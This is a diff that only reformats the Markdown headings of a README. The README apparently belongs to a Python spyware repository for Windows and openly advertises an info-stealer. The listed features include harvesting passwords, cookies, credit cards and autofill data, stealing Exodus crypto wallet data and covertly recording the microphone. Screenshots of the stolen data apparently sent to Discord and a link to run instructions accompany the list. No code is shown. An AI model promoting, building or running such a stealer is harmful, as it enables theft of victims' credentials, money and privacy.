@@ -2,7 +2,7 @@
 A logger/spyware written in python 3\
 Only works in windows, dont expect to work for other OS\
 \
-Features:
+### Features:
 ```
 • IP logger 🌐
 • System info 🖥️
@@ -17,7 +17,7 @@ Features:
 • Records 5s clip from mic as .wav 🎤
 • Crypto Wallet Stealer: Exodus👾, More soon
 ```
-# Discord Screenshots:
+## Discord Screenshots:
 \
 Screenshot and .zip files :\
 ![Alt text](img/SCREENIE1.png?raw=true)\
@@ -37,10 +37,10 @@ History-Bookmarks-Cookies-Passwords-CreditCards-Autofill.zip :\
 Exodus Appdata :\
 ![Alt text](img/SCREENIE6.png?raw=true)
 
-# How to Run:
+## How to Run:
 Go to https://github.com/TurtlesXD/Discord-Logger/blob/main/discord-logger-help/Help.md 
 
-# Upcoming features:
+### Upcoming features:
 • damn idk\
 Thanks for checking out my repository!\
 msg me at chickenpie8636
